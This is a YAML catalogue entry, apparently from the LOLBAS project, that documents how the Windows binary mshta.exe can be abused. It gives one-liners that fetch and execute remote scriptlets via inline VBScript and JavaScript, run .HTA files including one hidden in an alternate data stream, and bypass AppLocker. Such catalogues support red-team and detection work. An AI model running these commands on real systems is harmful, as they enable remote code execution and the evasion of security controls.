---
name: mshta.exe
description: 
functions:
  execute:
    - description: Opens the target .HTA and executes embedded JavaScript, JScript, or VBScript.
      code: mshta.exe evilfile.hta
    - description: Executes VBScript supplied as a command line argument.
      code: mshta.exe vbscript:Close(Execute("GetObject(""script:https[:]//webserver/payload[.]sct"")"))
    - description: Executes JavaScript supplied as a command line argument.
      code: mshta.exe javascript:a=GetObject("script:https://raw.githubusercontent.com/api0cradle/LOLBAS/master/OSBinaries/Payload/Mshta_calc.sct").Exec();close();
  ads:
    - description: Opens the target .HTA and executes embedded JavaScript, JScript, or VBScript.
      code: mshta.exe "C:\ads\file.txt:file.hta"
resources: 
    - resource: https://evi1cg.me/archives/AppLocker_Bypass_Techniques.html#menu_index_4
    - resource: https://oddvar.moe/2017/12/21/applocker-case-study-how-insecure-is-it-really-part-2/
    - resource: https://oddvar.moe/2018/01/14/putting-data-in-alternate-data-streams-and-how-to-execute-it/
fullpath: 
    - path: c:\windows\system32\mshta.exe
    - path: c:\windows\sysWOW64\mshta.exe
notes: Thanks to Casey Smith - @subtee, Oddvar Moe - @oddvarmoe
---